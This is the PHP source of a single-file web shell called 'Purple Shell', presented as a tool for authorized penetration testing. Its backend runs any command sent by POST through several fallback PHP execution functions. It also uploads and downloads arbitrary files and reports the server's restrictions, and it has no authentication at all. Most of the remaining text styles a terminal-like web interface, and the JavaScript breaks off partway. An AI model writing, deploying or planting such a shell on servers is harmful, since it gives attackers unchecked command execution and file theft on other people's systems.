<?php

/**

 * Purple Shell - Terminal Interface for Authorized Penetration Testing

 * A polished, single-file PHP web shell with a focus on UI/UX excellence.

 */

 

// ============================================================================

// Configuration

// ============================================================================

 

$CONFIG = [

    'title' => 'purple-shell',

    'username' => 'user',

    'hostname' => 'shell',

    'version' => '1.0.0',

];

 

// ============================================================================

// Initialization

// ============================================================================

 

function initConfig() {

    global $CONFIG;

 

    // Detect username

    if (stripos(PHP_OS, 'WIN') === 0) {

        $username = getenv('USERNAME');

        if ($username !== false) {

            $CONFIG['username'] = $username;

        }

    } else {

        if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {

            $pwuid = @posix_getpwuid(posix_geteuid());

            if ($pwuid !== false && isset($pwuid['name'])) {

                $CONFIG['username'] = $pwuid['name'];

            }

        }

    }

 

    // Detect hostname

    $hostname = @gethostname();

    if ($hostname !== false) {

        $CONFIG['hostname'] = $hostname;

    }

}

 

// ============================================================================

// Command Execution Engine

// ============================================================================

 

function executeCommand($cmd) {

    $output = '';

 

    if (function_exists('proc_open')) {

        $descriptors = [

            0 => ['pipe', 'r'],

            1 => ['pipe', 'w'],

            2 => ['pipe', 'w']

        ];

        $process = @proc_open($cmd, $descriptors, $pipes);

        if (is_resource($process)) {

            fclose($pipes[0]);

            $output = stream_get_contents($pipes[1]);

            $stderr = stream_get_contents($pipes[2]);

            fclose($pipes[1]);

            fclose($pipes[2]);

            proc_close($process);

            if (!empty($stderr) && empty($output)) {

                $output = $stderr;

            } elseif (!empty($stderr)) {

                $output .= "\n" . $stderr;

            }

        }

    } elseif (function_exists('shell_exec')) {

        $output = @shell_exec($cmd);

    } elseif (function_exists('exec')) {

        @exec($cmd, $lines);

        $output = implode("\n", $lines);

    } elseif (function_exists('system')) {

        ob_start();

        @system($cmd);

        $output = ob_get_clean();

    } elseif (function_exists('passthru')) {

        ob_start();

        @passthru($cmd);

        $output = ob_get_clean();

    } elseif (function_exists('popen')) {

        $handle = @popen($cmd, 'r');

        if ($handle) {

            while (!feof($handle)) {

                $output .= fread($handle, 4096);

            }

            pclose($handle);

        }

    }

 

    return $output;

}

 

function expandPath($path) {

    if (preg_match('/^~([^\/]*)(.*)$/', $path, $match)) {

        if (empty($match[1])) {

            $home = getenv('HOME') ?: (getenv('HOMEDRIVE') . getenv('HOMEPATH'));

            return $home . $match[2];

        }

        $result = @posix_getpwnam($match[1]);

        if ($result) {

            return $result['dir'] . $match[2];

        }

    }

    return $path;

}

 

function isWindows() {

    return stripos(PHP_OS, 'WIN') === 0;

}

 

// ============================================================================

// Feature Handlers

// ============================================================================

 

function handleShell($cmd, $cwd) {

    if (empty($cmd)) {

        return ['stdout' => '', 'cwd' => base64_encode($cwd)];

    }

 

    // Handle cd command

    if (preg_match('/^\s*cd\s*$/', $cmd)) {

        $home = expandPath('~');

        if (@chdir($home)) {

            return ['stdout' => '', 'cwd' => base64_encode(getcwd())];

        }

    } elseif (preg_match('/^\s*cd\s+(.+?)\s*$/', $cmd, $match)) {

        @chdir($cwd);

        $target = expandPath(trim($match[1]));

        if (@chdir($target)) {

            return ['stdout' => '', 'cwd' => base64_encode(getcwd())];

        } else {

            return ['stdout' => base64_encode("cd: $target: No such file or directory"), 'cwd' => base64_encode($cwd)];

        }

    }

 

    // Handle download command

    if (preg_match('/^\s*download\s+(.+?)\s*$/', $cmd, $match)) {

        @chdir($cwd);

        return handleDownload(trim($match[1]));

    }

 

    // Regular command execution

    @chdir($cwd);

    if (!preg_match('/2>/', $cmd)) {

        $cmd .= ' 2>&1';

    }

    $output = executeCommand($cmd);

 

    return [

        'stdout' => base64_encode($output),

        'cwd' => base64_encode(getcwd())

    ];

}

 

function handlePwd() {

    return ['cwd' => base64_encode(getcwd())];

}

 

function handleDownload($path) {

    $content = @file_get_contents($path);

    if ($content === false) {

        return [

            'stdout' => base64_encode("download: Cannot read file: $path"),

            'cwd' => base64_encode(getcwd())

        ];

    }

    return [

        'download' => true,

        'name' => base64_encode(basename($path)),

        'content' => base64_encode($content)

    ];

}

 

function handleUpload($filename, $content, $cwd) {

    @chdir($cwd);

    $decoded = base64_decode($content);

    if (@file_put_contents($filename, $decoded) !== false) {

        return [

            'stdout' => base64_encode("Uploaded: $filename (" . strlen($decoded) . " bytes)"),

            'cwd' => base64_encode(getcwd())

        ];

    }

    return [

        'stdout' => base64_encode("upload: Failed to write file: $filename"),

        'cwd' => base64_encode(getcwd())

    ];

}

 

function handleHint($input, $cwd, $type) {

    @chdir($cwd);

 

    if (isWindows()) {

        return ['hints' => []];

    }

 

    $cmd = $type === 'cmd' ? "compgen -c " : "compgen -f ";

    $cmd .= escapeshellarg($input);

    $cmd = "/bin/bash -c " . escapeshellarg($cmd) . " 2>/dev/null";

 

    $output = executeCommand($cmd);

    $hints = array_filter(explode("\n", trim($output)));

    $hints = array_map('base64_encode', $hints);

 

    return ['hints' => $hints];

}

 

function handleLs($cwd, $path = '.') {

    @chdir($cwd);

    $target = $path === '.' ? $cwd : $path;

 

    if (!is_dir($target)) {

        return ['error' => 'Not a directory'];

    }

 

    $items = [];

    $files = @scandir($target);

 

    if ($files === false) {

        return ['error' => 'Cannot read directory'];

    }

 

    foreach ($files as $file) {

        if ($file === '.') continue;

 

        $fullPath = rtrim($target, '/') . '/' . $file;

        $stat = @stat($fullPath);

 

        $items[] = [

            'name' => $file,

            'isDir' => is_dir($fullPath),

            'isLink' => is_link($fullPath),

            'size' => $stat ? $stat['size'] : 0,

            'mtime' => $stat ? $stat['mtime'] : 0,

            'perms' => $stat ? decoct($stat['mode'] & 0777) : '000',

            'readable' => is_readable($fullPath),

            'writable' => is_writable($fullPath),

            'executable' => is_executable($fullPath),

        ];

    }

 

    return ['items' => $items, 'path' => $target];

}

 

function handleSysinfo() {

    $info = [

        'os' => PHP_OS,

        'php' => PHP_VERSION,

        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',

        'user' => get_current_user(),

        'uid' => function_exists('posix_getuid') ? posix_getuid() : 'N/A',

        'gid' => function_exists('posix_getgid') ? posix_getgid() : 'N/A',

        'cwd' => getcwd(),

        'uname' => php_uname(),

        'safe_mode' => @ini_get('safe_mode') ? 'On' : 'Off',

        'open_basedir' => @ini_get('open_basedir') ?: 'None',

        'disable_functions' => @ini_get('disable_functions') ?: 'None',

    ];

    return ['info' => $info];

}

 

// ============================================================================

// API Router

// ============================================================================

 

if (isset($_GET['action'])) {

    header('Content-Type: application/json');

    header('Cache-Control: no-cache, no-store, must-revalidate');

 

    $action = $_GET['action'];

    $response = null;

 

    switch ($action) {

        case 'shell':

            $cmd = $_POST['cmd'] ?? '';

            $cwd = $_POST['cwd'] ?? getcwd();

            $response = handleShell($cmd, $cwd);

            break;

 

        case 'pwd':

            $response = handlePwd();

            break;

 

        case 'hint':

            $input = $_POST['input'] ?? '';

            $cwd = $_POST['cwd'] ?? getcwd();

            $type = $_POST['type'] ?? 'file';

            $response = handleHint($input, $cwd, $type);

            break;

 

        case 'upload':

            $filename = $_POST['filename'] ?? '';

            $content = $_POST['content'] ?? '';

            $cwd = $_POST['cwd'] ?? getcwd();

            $response = handleUpload($filename, $content, $cwd);

            break;

 

        case 'ls':

            $cwd = $_POST['cwd'] ?? getcwd();

            $path = $_POST['path'] ?? '.';

            $response = handleLs($cwd, $path);

            break;

 

        case 'sysinfo':

            $response = handleSysinfo();

            break;

 

        default:

            $response = ['error' => 'Unknown action'];

    }

 

    echo json_encode($response);

    exit;

}

 

// Initialize for page render

initConfig();

$initialCwd = getcwd();

 

?><!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title><?php echo htmlspecialchars($CONFIG['title']); ?></title>

    <style>

        :root {

            --bg-deep: #0d0a14;

            --bg-dark: #13101c;

            --bg-panel: #1a1525;

            --bg-input: #211b2e;

            --bg-hover: #2a2340;

            --bg-active: #352d4a;

 

            --purple-dim: #4a3f6b;

            --purple-mid: #6b5b95;

            --purple-bright: #9d8ccc;

            --purple-glow: #b8a5e3;

            --purple-accent: #c4b5fd;

 

            --text-dim: #6b6280;

            --text-muted: #9890a8;

            --text-normal: #c8c3d4;

            --text-bright: #e8e4f0;

            --text-white: #f5f3fa;

 

            --green-prompt: #7dd3a0;

            --blue-path: #7dc4e4;

            --red-error: #f38ba8;

            --yellow-warn: #f9e2af;

            --orange-file: #fab387;

            --cyan-link: #89dceb;

 

            --border-subtle: rgba(139, 120, 180, 0.15);

            --border-normal: rgba(139, 120, 180, 0.25);

            --glow-purple: rgba(180, 160, 230, 0.3);

 

            --font-mono: 'JetBrains Mono', 'Fira Code', 'SF Mono', 'Cascadia Code', 'Consolas', monospace;

            --font-size: 13px;

            --line-height: 1.55;

 

            --radius-sm: 4px;

            --radius-md: 6px;

            --radius-lg: 10px;

 

            --transition-fast: 0.12s ease;

            --transition-normal: 0.2s ease;

        }

 

        *, *::before, *::after {

            box-sizing: border-box;

            margin: 0;

            padding: 0;

        }

 

        html, body {

            width: 100%;

            height: 100%;

            overflow: hidden;

            background: var(--bg-deep);

            font-family: var(--font-mono);

            font-size: var(--font-size);

            line-height: var(--line-height);

            color: var(--text-normal);

            -webkit-font-smoothing: antialiased;

            -moz-osx-font-smoothing: grayscale;

        }

 

        /* Scrollbar Styling */

        ::-webkit-scrollbar {

            width: 10px;

            height: 10px;

        }

 

        ::-webkit-scrollbar-track {

            background: var(--bg-dark);

            border-radius: var(--radius-sm);

        }

 

        ::-webkit-scrollbar-thumb {

            background: var(--purple-dim);

            border-radius: var(--radius-sm);

            border: 2px solid var(--bg-dark);

        }

 

        ::-webkit-scrollbar-thumb:hover {

            background: var(--purple-mid);

        }

 

        ::-webkit-scrollbar-corner {

            background: var(--bg-dark);

        }

 

        /* Layout */

        #app {

            display: flex;

            flex-direction: column;

            width: 100%;

            height: 100%;

            padding: 12px;

            gap: 12px;

        }

 

        /* Header Bar */

        #header {

            display: flex;

            align-items: center;

            justify-content: space-between;

            padding: 10px 16px;

            background: var(--bg-panel);

            border: 1px solid var(--border-subtle);

            border-radius: var(--radius-lg);

            flex-shrink: 0;

        }

 

        #header-title {

            display: flex;

            align-items: center;

            gap: 10px;

            color: var(--purple-accent);

            font-weight: 600;

            font-size: 14px;

            letter-spacing: 0.02em;

        }

 

        #header-title svg {

            width: 18px;

            height: 18px;

            opacity: 0.9;

        }

 

        #header-info {

            display: flex;

            align-items: center;

            gap: 16px;

            font-size: 12px;

            color: var(--text-muted);

        }

 

        .header-badge {

            display: flex;

            align-items: center;

            gap: 6px;

            padding: 4px 10px;

            background: var(--bg-input);

            border-radius: var(--radius-md);

            transition: var(--transition-fast);

        }

 

        .header-badge:hover {

            background: var(--bg-hover);

            color: var(--text-bright);

        }

 

        .header-badge svg {

            width: 14px;

            height: 14px;

            opacity: 0.7;

        }

 

        /* Main Terminal */

        #terminal {

            flex: 1;

            display: flex;

            flex-direction: column;

            background: var(--bg-dark);

            border: 1px solid var(--border-subtle);

            border-radius: var(--radius-lg);

            overflow: hidden;

            min-height: 0;

        }

 

        /* Terminal Output */

        #output {

            flex: 1;

            overflow-y: auto;

            overflow-x: hidden;

            padding: 16px;

            min-height: 0;

        }

 

        #output-content {

            white-space: pre-wrap;

            word-wrap: break-word;

            word-break: break-all;

        }

 

        .output-block {

            margin-bottom: 12px;

            animation: fadeIn 0.15s ease;

        }

 

        @keyframes fadeIn {

            from { opacity: 0; transform: translateY(4px); }

            to { opacity: 1; transform: translateY(0); }

        }

 

        .prompt-line {

            display: flex;

            flex-wrap: wrap;

            align-items: baseline;

            gap: 0;

            margin-bottom: 2px;

        }

 

        .prompt-user {

            color: var(--green-prompt);

            font-weight: 600;

        }

 

        .prompt-at {

            color: var(--text-dim);

        }

 

        .prompt-host {

            color: var(--purple-bright);

            font-weight: 600;

        }

 

        .prompt-separator {

            color: var(--text-dim);

            margin: 0 1px;

        }

 

        .prompt-path {

            color: var(--blue-path);

            font-weight: 500;

        }

 

        .prompt-symbol {

            color: var(--purple-accent);

            margin-left: 6px;

            font-weight: 700;

        }

 

        .cmd-text {

            color: var(--text-white);

            margin-left: 8px;

        }

 

        .output-text {

            color: var(--text-normal);

            padding-left: 2px;

            line-height: 1.5;

        }

 

        .output-error {

            color: var(--red-error);

        }

 

        .output-success {

            color: var(--green-prompt);

        }

 

        /* Welcome Message */

        #welcome {

            margin-bottom: 20px;

            padding-bottom: 16px;

            border-bottom: 1px solid var(--border-subtle);

        }

 

        .welcome-logo {

            color: var(--purple-bright);

            font-size: 11px;

            line-height: 1.2;

            margin-bottom: 12px;

            opacity: 0.85;

        }

 

        .welcome-info {

            display: flex;

            flex-wrap: wrap;

            gap: 8px 20px;

            font-size: 12px;

            color: var(--text-muted);

        }

 

        .welcome-info span {

            display: flex;

            align-items: center;

            gap: 6px;

        }

 

        .welcome-info .label {

            color: var(--text-dim);

        }

 

        .welcome-info .value {

            color: var(--purple-accent);

        }

 

        /* Input Area */

        #input-area {

            display: flex;

            align-items: stretch;

            padding: 12px 16px;

            background: var(--bg-panel);

            border-top: 1px solid var(--border-subtle);

            gap: 0;

            flex-shrink: 0;

        }

 

        #input-prompt {

            display: flex;

            align-items: center;

            padding-right: 8px;

            flex-shrink: 0;

            user-select: none;

        }

 

        #input-wrapper {

            flex: 1;

            position: relative;

            display: flex;

            align-items: center;

        }

 

        #cmd-input {

            width: 100%;

            background: transparent;

            border: none;

            outline: none;

            color: var(--text-white);

            font-family: var(--font-mono);

            font-size: var(--font-size);

            line-height: 1.5;

            caret-color: var(--purple-accent);

            padding: 6px 0;

        }

 

        #cmd-input::placeholder {

            color: var(--text-dim);

            opacity: 0.6;

        }

 

        #input-hint {

            position: absolute;

            left: 0;

            top: 50%;

            transform: translateY(-50%);

            color: var(--text-dim);

            pointer-events: none;

            opacity: 0.4;

        }

 

        /* Status Bar */

        #status-bar {

            display: flex;

            align-items: center;

            justify-content: space-between;

            padding: 8px 16px;

            background: var(--bg-panel);

            border: 1px solid var(--border-subtle);

            border-radius: var(--radius-lg);

            font-size: 11px;

            color: var(--text-dim);

            flex-shrink: 0;

        }

 

        #status-left {

            display: flex;

            align-items: center;

            gap: 16px;

        }

 

        #status-right {

            display: flex;

            align-items: center;

            gap: 12px;

        }

 

        .status-item {

            display: flex;

            align-items: center;

            gap: 5px;

        }

 

        .status-key {

            padding: 2px 6px;

            background: var(--bg-input);

            border-radius: 3px;

            font-size: 10px;

            color: var(--text-muted);

        }

 

        #cwd-display {

            color: var(--blue-path);

            max-width: 400px;

            overflow: hidden;

            text-overflow: ellipsis;

            white-space: nowrap;

        }

 

        /* Help Overlay */

        #help-overlay {

            position: fixed;

            inset: 0;

            background: rgba(10, 8, 16, 0.85);

            backdrop-filter: blur(4px);

            display: none;

            align-items: center;

            justify-content: center;

            z-index: 1000;

            animation: fadeIn 0.15s ease;

        }

 

        #help-overlay.visible {

            display: flex;

        }

 

        #help-modal {

            background: var(--bg-panel);

            border: 1px solid var(--border-normal);

            border-radius: var(--radius-lg);

            padding: 24px;

            max-width: 500px;

            width: 90%;

            max-height: 80vh;

            overflow-y: auto;

            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);

        }

 

        #help-modal h2 {

            color: var(--purple-accent);

            font-size: 16px;

            margin-bottom: 16px;

            display: flex;

            align-items: center;

            gap: 8px;

        }

 

        #help-modal h3 {

            color: var(--text-bright);

            font-size: 12px;

            margin: 16px 0 10px;

            text-transform: uppercase;

            letter-spacing: 0.05em;

        }

 

        .help-row {

            display: flex;

            justify-content: space-between;

            align-items: center;

            padding: 6px 0;

            border-bottom: 1px solid var(--border-subtle);

        }

 

        .help-row:last-child {

            border-bottom: none;

        }

 

        .help-keys {

            display: flex;

            gap: 4px;

        }

 

        .help-key {

            padding: 3px 8px;

            background: var(--bg-input);

            border: 1px solid var(--border-subtle);

            border-radius: 4px;

            font-size: 11px;

            color: var(--text-bright);

        }

 

        .help-desc {

            color: var(--text-muted);

            font-size: 12px;

        }

 

        .help-close {

            margin-top: 20px;

            text-align: center;

            color: var(--text-dim);

            font-size: 11px;

        }

 

        /* File Browser Overlay */

        #browser-overlay {

            position: fixed;

            inset: 0;

            background: rgba(10, 8, 16, 0.9);

            backdrop-filter: blur(4px);

            display: none;

            z-index: 900;

        }

 

        #browser-overlay.visible {

            display: flex;

            flex-direction: column;

        }

 

        #browser-header {

            display: flex;

            align-items: center;

            justify-content: space-between;

            padding: 12px 20px;

            background: var(--bg-panel);

            border-bottom: 1px solid var(--border-subtle);

        }

 

        #browser-path {

            color: var(--blue-path);

            font-size: 13px;

        }

 

        #browser-close {

            padding: 6px 14px;

            background: var(--bg-input);

            border: 1px solid var(--border-subtle);

            border-radius: var(--radius-md);

            color: var(--text-muted);

            font-family: var(--font-mono);

            font-size: 12px;

            cursor: pointer;

            transition: var(--transition-fast);

        }

 

        #browser-close:hover {

            background: var(--bg-hover);

            color: var(--text-bright);

        }

 

        #browser-content {

            flex: 1;

            overflow-y: auto;

            padding: 12px;

        }

 

        #browser-list {

            display: flex;

            flex-direction: column;

            gap: 2px;

        }

 

        .browser-item {

            display: flex;

            align-items: center;

            gap: 12px;

            padding: 10px 14px;

            background: transparent;

            border: none;

            border-radius: var(--radius-md);

            color: var(--text-normal);

            font-family: var(--font-mono);

            font-size: 13px;

            cursor: pointer;

            transition: var(--transition-fast);

            text-align: left;

            width: 100%;

        }

 

        .browser-item:hover, .browser-item.selected {

            background: var(--bg-hover);

        }

 

        .browser-item.selected {

            background: var(--bg-active);

            color: var(--text-white);

        }

 

        .browser-item.is-dir {

            color: var(--blue-path);

        }

 

        .browser-item.is-link {

            color: var(--cyan-link);

        }

 

        .browser-item.is-exec {

            color: var(--green-prompt);

        }

 

        .browser-icon {

            width: 16px;

            text-align: center;

            flex-shrink: 0;

        }

 

        .browser-name {

            flex: 1;

            overflow: hidden;

            text-overflow: ellipsis;

            white-space: nowrap;

        }

 

        .browser-size {

            color: var(--text-dim);

            font-size: 11px;

            flex-shrink: 0;

        }

 

        .browser-perms {

            color: var(--text-dim);

            font-size: 11px;

            flex-shrink: 0;

            font-family: var(--font-mono);

        }

 

        #browser-status {

            padding: 10px 20px;

            background: var(--bg-panel);

            border-top: 1px solid var(--border-subtle);

            font-size: 11px;

            color: var(--text-dim);

            display: flex;

            gap: 20px;

        }

 

        /* Loading Indicator */

        .loading-indicator {

            display: inline-flex;

            align-items: center;

            gap: 8px;

            color: var(--purple-bright);

            padding: 4px 0;

        }

 

        .loading-spinner {

            width: 14px;

            height: 14px;

            border: 2px solid var(--border-normal);

            border-top-color: var(--purple-accent);

            border-radius: 50%;

            animation: spin 0.8s linear infinite;

        }

 

        @keyframes spin {

            to { transform: rotate(360deg); }

        }

 

        /* Upload Area */

        #upload-zone {

            position: fixed;

            inset: 0;

            background: rgba(10, 8, 16, 0.9);

            display: none;

            align-items: center;

            justify-content: center;

            z-index: 1100;

        }

 

        #upload-zone.visible {

            display: flex;

        }

 

        #upload-box {

            padding: 60px 80px;

            background: var(--bg-panel);

            border: 2px dashed var(--purple-mid);

            border-radius: var(--radius-lg);

            text-align: center;

            color: var(--text-muted);

        }

 

        #upload-box.dragover {

            border-color: var(--purple-accent);

            background: var(--bg-hover);

        }

 

        /* Context Menu */

        #context-menu {

            position: fixed;

            background: var(--bg-panel);

            border: 1px solid var(--border-normal);

            border-radius: var(--radius-md);

            padding: 6px 0;

            min-width: 180px;

            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);

            z-index: 1200;

            display: none;

        }

 

        #context-menu.visible {

            display: block;

        }

 

        .context-item {

            display: flex;

            align-items: center;

            gap: 10px;

            padding: 8px 14px;

            color: var(--text-normal);

            font-size: 12px;

            cursor: pointer;

            transition: var(--transition-fast);

        }

 

        .context-item:hover {

            background: var(--bg-hover);

            color: var(--text-white);

        }

 

        .context-divider {

            height: 1px;

            background: var(--border-subtle);

            margin: 6px 0;

        }

 

        /* Responsive */

        @media (max-width: 768px) {

            #app {

                padding: 8px;

                gap: 8px;

            }

 

            #header {

                flex-direction: column;

                gap: 10px;

                text-align: center;

            }

 

            #header-info {

                flex-wrap: wrap;

                justify-content: center;

            }

 

            .welcome-logo {

                font-size: 8px;

            }

 

            #status-bar {

                flex-direction: column;

                gap: 8px;

            }

        }

 

        /* Selection */

        ::selection {

            background: var(--purple-mid);

            color: var(--text-white);

        }

    </style>

</head>

<body>

    <div id="app">

        <header id="header">

            <div id="header-title">

                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">

                    <polyline points="4 17 10 11 4 5"></polyline>

                    <line x1="12" y1="19" x2="20" y2="19"></line>

                </svg>

                <span>purple-shell</span>

            </div>

            <div id="header-info">

                <div class="header-badge" id="user-badge">

                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">

                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>

                        <circle cx="12" cy="7" r="4"></circle>

                    </svg>

                    <span id="display-user"><?php echo htmlspecialchars($CONFIG['username']); ?></span>

                </div>

                <div class="header-badge" id="host-badge">

                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">

                        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>

                        <line x1="8" y1="21" x2="16" y2="21"></line>

                        <line x1="12" y1="17" x2="12" y2="21"></line>

                    </svg>

                    <span id="display-host"><?php echo htmlspecialchars($CONFIG['hostname']); ?></span>

                </div>

                <div class="header-badge" id="help-toggle" title="Help (F1)">

                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">

                        <circle cx="12" cy="12" r="10"></circle>

                        <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>

                        <line x1="12" y1="17" x2="12.01" y2="17"></line>

                    </svg>

                    <span>Help</span>

                </div>

            </div>

        </header>

 

        <main id="terminal">

            <div id="output">

                <div id="output-content">

                    <div id="welcome">

                        <pre class="welcome-logo">'########::'##::::'##:'########::'########::'##:::::::'########:::::'######::'##::::'##:'########:'##:::::::'##:::::::
 ##.... ##: ##:::: ##: ##.... ##: ##.... ##: ##::::::: ##.....:::::'##... ##: ##:::: ##: ##.....:: ##::::::: ##:::::::
 ##:::: ##: ##:::: ##: ##:::: ##: ##:::: ##: ##::::::: ##:::::::::: ##:::..:: ##:::: ##: ##::::::: ##::::::: ##:::::::
 ########:: ##:::: ##: ########:: ########:: ##::::::: ######::::::. ######:: #########: ######::: ##::::::: ##:::::::
 ##.....::: ##:::: ##: ##.. ##::: ##.....::: ##::::::: ##...::::::::..... ##: ##.... ##: ##...:::: ##::::::: ##:::::::
 ##:::::::: ##:::: ##: ##::. ##:: ##:::::::: ##::::::: ##::::::::::'##::: ##: ##:::: ##: ##::::::: ##::::::: ##:::::::
 ##::::::::. #######:: ##:::. ##: ##:::::::: ########: ########::::. ######:: ##:::: ##: ########: ########: ########:
..::::::::::.......:::..:::::..::..:::::::::........::........::::::......:::..:::::..::........::........::........::</pre>

                        <div class="welcome-info">

                            <span><span class="label">User:</span> <span class="value" id="welcome-user"><?php echo htmlspecialchars($CONFIG['username']); ?></span></span>

                            <span><span class="label">Host:</span> <span class="value" id="welcome-host"><?php echo htmlspecialchars($CONFIG['hostname']); ?></span></span>

                            <span><span class="label">PHP:</span> <span class="value"><?php echo PHP_VERSION; ?></span></span>

                            <span><span class="label">OS:</span> <span class="value"><?php echo PHP_OS; ?></span></span>

                        </div>

                    </div>

                </div>

            </div>

 

            <div id="input-area">

                <div id="input-prompt">

                    <span class="prompt-user" id="prompt-user"><?php echo htmlspecialchars($CONFIG['username']); ?></span><span class="prompt-at">@</span><span class="prompt-host" id="prompt-host"><?php echo htmlspecialchars($CONFIG['hostname']); ?></span><span class="prompt-separator">:</span><span class="prompt-path" id="prompt-path">~</span><span class="prompt-symbol">$</span>

                </div>

                <div id="input-wrapper">

                    <input type="text" id="cmd-input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="Enter command...">

                </div>

            </div>

        </main>

 

        <footer id="status-bar">

            <div id="status-left">

                <div class="status-item">

                    <span class="status-key">F1</span>

                    <span>Help</span>

                </div>

                <div class="status-item">

                    <span class="status-key">F2</span>

                    <span>Browse</span>

                </div>

                <div class="status-item">

                    <span class="status-key">Tab</span>

                    <span>Complete</span>

                </div>

                <div class="status-item">

                    <span class="status-key">Ctrl+L</span>

                    <span>Clear</span>

                </div>

            </div>

            <div id="status-right">

                <span id="cwd-display"><?php echo htmlspecialchars($initialCwd); ?></span>

            </div>

        </footer>

    </div>

 

    <!-- Help Overlay -->

    <div id="help-overlay">

        <div id="help-modal">

            <h2>

                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">

                    <circle cx="12" cy="12" r="10"></circle>

                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>

                    <line x1="12" y1="17" x2="12.01" y2="17"></line>

                </svg>

                Keyboard Shortcuts

            </h2>

 

            <h3>Navigation</h3>

            <div class="help-row">

                <div class="help-keys"><span class="help-key">^</span> <span class="help-key">v</span></div>

                <span class="help-desc">Browse command history</span>

            </div>

            <div class="help-row">

                <div class="help-keys"><span class="help-key">Tab</span></div>

                <span class="help-desc">Auto-complete command/path</span>

            </div>

            <div class="help-row">

                <div class="help-keys"><span class="help-key">Ctrl</span> + <span class="help-key">L</span></div>

                <span class="help-desc">Clear terminal output</span>

            </div>

            <div class="help-row">

                <div class="help-keys"><span class="help-key">Ctrl</span> + <span class="help-key">C</span></div>

                <span class="help-desc">Cancel current input</span>

            </div>

 

            <h3>Features</h3>

            <div class="help-row">

                <div class="help-keys"><span class="help-key">F1</span></div>

                <span class="help-desc">Toggle this help</span>

            </div>

            <div class="help-row">

                <div class="help-keys"><span class="help-key">F2</span></div>

                <span class="help-desc">Open file browser</span>

            </div>

            <div class="help-row">

                <div class="help-keys"><span class="help-key">Esc</span></div>

                <span class="help-desc">Close overlays</span>

            </div>

 

            <h3>Built-in Commands</h3>

            <div class="help-row">

                <div class="help-keys"><span class="help-key">clear</span></div>

                <span class="help-desc">Clear terminal</span>

            </div>

            <div class="help-row">

                <div class="help-keys"><span class="help-key">download &lt;file&gt;</span></div>

                <span class="help-desc">Download a file</span>

            </div>

            <div class="help-row">

                <div class="help-keys"><span class="help-key">upload &lt;name&gt;</span></div>

                <span class="help-desc">Upload a file</span>

            </div>

            <div class="help-row">

                <div class="help-keys"><span class="help-key">sysinfo</span></div>

                <span class="help-desc">Show system information</span>

            </div>

 

            <p class="help-close">Press <span class="help-key">Esc</span> or <span class="help-key">F1</span> to close</p>

        </div>

    </div>

 

    <!-- File Browser Overlay -->

    <div id="browser-overlay">

        <div id="browser-header">

            <span id="browser-path">/</span>

            <button id="browser-close">Close (Esc)</button>

        </div>

        <div id="browser-content">

            <div id="browser-list"></div>

        </div>

        <div id="browser-status">

            <span><span class="status-key">^v</span> Navigate</span>

            <span><span class="status-key">Enter</span> Open directory / Select file</span>

            <span><span class="status-key">Backspace</span> Go up</span>

            <span><span class="status-key">Esc</span> Close</span>

        </div>

    </div>

 

    <!-- Upload Zone -->

    <div id="upload-zone">

        <div id="upload-box">

            <p>Drop file to upload</p>

            <p style="margin-top: 10px; font-size: 11px; color: var(--text-dim);">or press Esc to cancel</p>

        </div>

    </div>

 

    <!-- Context Menu -->

    <div id="context-menu">

        <div class="context-item" data-action="cd">Open directory</div>

        <div class="context-item" data-action="view">View file</div>

        <div class="context-item" data-action="download">Download</div>

        <div class="context-divider"></div>

        <div class="context-item" data-action="copy-path">Copy path</div>

    </div>

 

    <script>

    (function() {

        'use strict';

 

        // ====================================================================

        // State

        // ====================================================================

 

        const state = {

            cwd: <?php echo json_encode($initialCwd); ?>,

            history: [],

            historyIndex: -1,

            isLoading: false,

            browserPath: <?php echo json_encode($initialCwd); ?>,

            browserItems: [],

            browserSelectedIndex: 0,

        };

 

        const config = {

            username: <?php echo json_encode($CONFIG['username']); ?>,

            hostname: <?php echo json_encode($CONFIG['hostname']); ?>,

        };

 

        // ====================================================================

        // DOM Elements

        // ====================================================================

 

        const elements = {

            output: document.getElementById('output'),

            outputContent: document.getElementById('output-content'),

            cmdInput: document.getElementById('cmd-input'),

            promptPath: document.getElementById('prompt-path'),

            cwdDisplay: document.getElementById('cwd-display'),

            helpOverlay: document.getElementById('help-overlay'),

            helpToggle: document.getElementById('help-toggle'),

            browserOverlay: document.getElementById('browser-overlay'),

            browserPath: document.getElementById('browser-path'),

            browserList: document.getElementById('browser-list'),

            browserClose: document.getElementById('browser-close'),

            uploadZone: document.getElementById('upload-zone'),

            uploadBox: document.getElementById('upload-box'),

            contextMenu: document.getElementById('context-menu'),

        };

 

        // ====================================================================

        // Utilities

        // ====================================================================

 

        function escapeHtml(str) {

            const div = document.createElement('div');

            div.textContent = str;

            return div.innerHTML;

        }

 

        function formatBytes(bytes) {

            if (bytes === 0) return '0 B';

            const k = 1024;

            const sizes = ['B', 'K', 'M', 'G', 'T'];

            const i = Math.floor(Math.log(bytes) / Math.log(k));

            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];

        }

 

        function shortenPath(path, maxLen = 40) {

            if (path.length <= maxLen) return path;

            const parts = path.split('/');

            if (parts.length <= 3) return path;

            return '.../' + parts.slice(-2).join('/');

        }

 

        async function request(action, data = {}) {

            const formData = new URLSearchParams();

            for (const [key, value] of Object.entries(data)) {

                formData.append(key, value);

            }

 

            const response = await fetch(`?action=${action}`, {

                method: 'POST',

                headers: {

                    'Content-Type': 'application/x-www-form-urlencoded',

                },

                body: formData.toString(),

            });

 

            return response.json();

        }

 

